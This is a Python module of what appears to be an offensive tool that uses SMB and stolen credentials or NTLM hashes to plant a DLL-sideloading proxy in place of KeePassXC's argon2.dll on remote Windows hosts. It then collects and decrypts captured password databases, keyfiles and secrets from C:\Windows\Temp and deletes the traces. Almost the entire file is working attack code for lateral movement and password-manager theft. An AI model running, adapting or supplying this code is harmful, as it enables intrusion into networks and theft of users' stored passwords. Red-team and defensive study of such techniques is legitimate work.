from io import BytesIO
import platform
from impacket.smbconnection import SMBConnection, SessionError
from impacket import smb
from shutil import copy
from os import environ, path


import logging
import pefile
import time
import subprocess
import tempfile
import hashlib

from renameLockedFiled import renameLockedFiled

DLL_SIDELOAD_SUFFIX = "_bak"


class KeePassXCFox:
    def __init__(
        self,
        domain: str,
        username: str,
        password: str,
        lmhash: str,
        nthash: str,
        aesKey: str,
        useKerberos: bool,
        dc_ip: str | None,
        tempDir: str,
        share: str,
        path: str,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.useKerberos = useKerberos
        self.dc_ip = dc_ip
        self.tempDir = tempDir
        self.share = share
        self.path = path

    def dropSideloadingDll(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            smbClient.createDirectory("C$", f"{tempPath}")
        except SessionError as e:
            if e.getErrorCode() == 0xC0000035:
                # STATUS_OBJECT_NAME_COLLISION, occurs if the directory already exists
                logging.warning(
                    f"Temporary directory already exists, assuming it is ok."
                )
            else:
                logging.error(f"Error while creating C:\\{tempPath} ")
                return

        # We perform the sideloading by hijacking a dll in the program directory
        # First we list available DLLs, do not use hardcoded names as they change depanding on the OS version

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                self.share, f"{self.path}/*"
            )

        except SessionError as e:
            logging.error(f"[{host}] Failed opening directory {self.path}")
            return False

        dllsInDirectory = [
            f.get_longname()
            for f in filesInConfigDirectory
            if f.get_longname().endswith(".dll")
        ]

        # First, let's check that we haven't already dropped a sideloaded DLL

        if any(
            [
                dllName.removesuffix(".dll") + DLL_SIDELOAD_SUFFIX + ".dll"
                in dllsInDirectory
                for dllName in dllsInDirectory
            ]
        ):
            logging.warning(
                f"[{host}] Found a sideloaded DLL, assuming injection already performed. Skipping"
            )
            return True

        try:
            dllData = BytesIO()
            smbClient.getFile(self.share, f"{self.path}/argon2.dll", dllData.write)
        except SessionError as e:
            logging.error(
                f"[{host}] Failed opening/reading {self.share}\\{self.path}\\argon2.dll"
            )
            logging.error(e)
            return

        # Now list exported functions to see if they contain mangled names.

        dll = pefile.PE(data=dllData.getvalue(), fast_load=False)
        dll.parse_data_directories()

        # Sanity check : ensure that it is the correct architecure

        if dll.FILE_HEADER.Machine != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]:
            logging.error("Unexpected architecture")
            return

        try:
            exports = [e for e in dll.DIRECTORY_ENTRY_EXPORT.symbols]
        except AttributeError:
            logging.error(f"[{host}] Failed parsing exports of argon2.dll, aborting")
            return

        # Ensure that no symbol are only exported by ordinal
        if any([b"" == export.name for export in exports]):
            logging.error(
                f"[{host}] DLL argon2.dll exports a symbol by ordinal only, skipping"
            )

        # Before compiling the DLL, let's check if we have already compiled a proxy DLL for this specific version

        # Let's compute the MD5 of the data
        dllMd5 = hashlib.md5(dllData.getvalue()).hexdigest()

        # Check if we have already created the proxy dll
        if not path.exists(
            path.join(
                path.dirname(__file__),
                "cache",
                f'{"argon2." + dllMd5 + ".dll"}',
            )
        ):
            # It doesn't exist yet, let's create the exported function list for our DLL
            # The .def file is not recognized if the extension is not .def

            tempFileHandle = tempfile.NamedTemporaryFile(
                mode="w", suffix=".data", delete=False
            )
            for export in exports:
                tempFileHandle.write(
                    f'{export.name.decode()}={"argon2" + DLL_SIDELOAD_SUFFIX}.{export.name.decode()} @{export.ordinal}\n'
                )

            tempFileHandle.flush()

            cargo_path = path.abspath(
                path.join(path.dirname(__file__), "..", "keepassxcfox")
            )

            cmd = ["cargo", "clean"]

            subprocess.run(cmd, cwd=cargo_path)

            # Now let's compile our sideloaded DLL with the matching exports

            if platform.system() == "Windows":
                targetName = "x86_64-pc-windows-msvc"
            else:
                targetName = "x86_64-pc-windows-gnu"

            # Now let's compile our sideloaded DLL with the matching exports
            cmd = ["cargo", "build", "--target", targetName, "--release"]

            logging.info(f"[{host}] Compiling proxy argon2.dll ...")

            new_env = environ
            new_env["OUTPUT_PATH"] = f"C:\\{tempPath}\\keepassxc."
            if platform.system() == "Windows":
                from win32 import win32file

                new_env["EXPORTS_FILE"] = win32file.GetLongPathName(tempFileHandle.name)
            else:
                new_env["EXPORTS_FILE"] = tempFileHandle.name

            subprocess.run(cmd, cwd=cargo_path, env=new_env)

            # We don't need the temporary file anymore
            tempFileHandle.close()

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "keepassxcfox",
                        "target",
                        targetName,
                        # "debug",
                        "release",
                        "keepassxcfox.dll",
                    )
                ),
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "cache",
                        f'{"argon2." + dllMd5 + ".dll"}',
                    )
                ),
            )

        # Get our DLL data
        with open(
            path.abspath(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    f'{"argon2." + dllMd5 + ".dll"}',
                )
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        # Now let's rename the original DLL that we are going to hijack
        # A custom implementation is used instead of SMBConnection.rename, because it opens the file with MAXIMUM_ALLOWED access right,
        # which is refused if the DLL is open by the KeePassXC executable (KeePassXC is running)
        try:
            renameLockedFiled(
                smbClient,
                self.share,
                self.path + "argon2.dll",
                self.path + "argon2" + DLL_SIDELOAD_SUFFIX + ".dll",
            )
        except SessionError as e:
            logging.error(
                f'[{host}] Could not rename file {self.path + "argon2.dll"} to {self.path + "argon2" + DLL_SIDELOAD_SUFFIX + ".dll"}'
            )
            return False

        # Now we can replace the original DLL
        uploadData = BytesIO(dllDataToUpload)
        try:
            smbClient.putFile(self.share, f"{self.path}\\argon2.dll", uploadData.read)
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading argon2.dll Manager to {self.share}\\{self.path}"
            )
            logging.error(e)
            return False

        print(f"[{host}] Successfully hijacked KeePassXC.exe")

    def cleanup(self, host):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                self.share, f"{self.path}/*"
            )

        except SessionError as e:
            logging.error(
                f"[{host}] Failed opening directory {self.share}\\{self.path}"
            )
            return False

        dllsInDirectory = [
            f.get_longname()
            for f in filesInConfigDirectory
            if f.get_longname().endswith(".dll")
        ]

        # First, let's check that we haven't already dropped a sideloaded DLL

        if any([DLL_SIDELOAD_SUFFIX in dllName for dllName in dllsInDirectory]):
            timestamp = str(int(time.time()))
            try:
                renameLockedFiled(
                    smbClient,
                    self.share,
                    self.path + "argon2.dll",
                    self.path + f"argon2.{timestamp}",
                )
            except SessionError as e:
                logging.error(
                    f'[{host}] Could not rename file {self.path + "argon2.dll"} to {self.path + timestamp}'
                )

            try:
                renameLockedFiled(
                    smbClient,
                    self.share,
                    self.path + "argon2" + DLL_SIDELOAD_SUFFIX + ".dll",
                    self.path + "argon2.dll",
                )
            except SessionError as e:
                logging.error(
                    f'[{host}] Could not rename file {self.path + "argon2" + DLL_SIDELOAD_SUFFIX + ".dll"} to {self.path + "argon2.dll"}'
                )

            try:
                smbClient.deleteFile(self.share, self.path + f"argon2.{timestamp}")
            except SessionError as e:
                if (
                    e.getErrorCode() == 0xC0000043 or e.getErrorCode() == 0xC0000121
                ):  # STATUS_SHARING_VIOLATION or STATUS_CANNOT_DELETE
                    logging.warning(
                        f"[{host}] Failed cleaning up argon2.{timestamp} from {self.share}\\{self.path}. It is probably in use."
                    )
                else:
                    logging.error(
                        f'[{host}] Could not delete file {self.path + f"argon2.{timestamp}" }'
                    )
                    logging.error(e)

        # Now clean up any rem
        oldFilesInDirectory = [
            f.get_longname()
            for f in filesInConfigDirectory
            if f.get_longname().count(".") == 1
            and f.get_longname().split(".")[1].isnumeric()
        ]

        for oldFile in oldFilesInDirectory:
            try:
                smbClient.deleteFile(self.share, self.path + f"{oldFile}")
            except SessionError as e:
                if (
                    e.getErrorCode() == 0xC0000043 or e.getErrorCode() == 0xC0000121
                ):  # STATUS_SHARING_VIOLATION or STATUS_CANNOT_DELETE
                    logging.warning(
                        f"[{host}] Failed cleaning up {oldFile} from {self.share}\\{self.path}. It is probably in use."
                    )
                else:
                    logging.error(
                        f"[{host}] Could not delete file {self.path}\\{oldFile}"
                    )
                    logging.error(e)

        print(f"[{host}] KeePassXC.exe cleanup complete !")
        return

    def collect(self, host, box):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                "c$", f"{tempPath}/*"
            )

            outputFiles = [
                f.get_longname()
                for f in filesInConfigDirectory
                if f.get_longname().startswith("keepassxc.")
            ]

            for file in outputFiles:
                try:
                    outputData = BytesIO()
                    smbClient.getFile("C$", f"{tempPath}\\{file}", outputData.write)
                except SessionError:
                    logging.error(
                        f"[{host}] Failed opening/reading C:\\{tempPath}\\{file}"
                    )
                    logging.error(e)
                    continue

                if ".kdbx." in file:
                    plaintexts = box.decryptFile(outputData.getvalue(), isFile=True)

                    for index, plaintext in enumerate(plaintexts):
                        with open(
                            path.join(
                                path.dirname(__file__), "output", f"{index}-" + file
                            ),
                            "wb",
                        ) as f:
                            f.write(plaintext)

                elif ".keyfile." in file:
                    plaintexts = box.decryptFile(outputData.getvalue(), isFile=True)

                    for index, plaintext in enumerate(plaintexts):
                        with open(
                            path.join(
                                path.dirname(__file__), "output", f"{index}-" + file
                            ),
                            "wb",
                        ) as f:
                            f.write(plaintext)

                else:
                    plaintexts = box.decryptFile(outputData.getvalue())
                    with open(
                        path.join(
                            path.dirname(__file__),
                            "output",
                            f"keepassxc-{int(time.time())}.txt",
                        ),
                        "a",
                    ) as f:
                        for plaintext in plaintexts:
                            f.write(plaintext)
                            f.write(plaintext + "\n")

                # Now, let's delete the file one the remote host
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.error(
                        f"[{host}] Failed deleting C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

        except SessionError as e:
            logging.error(f"[{host}] Failed opening directory C:\\{self.path}")
            logging.error(e)
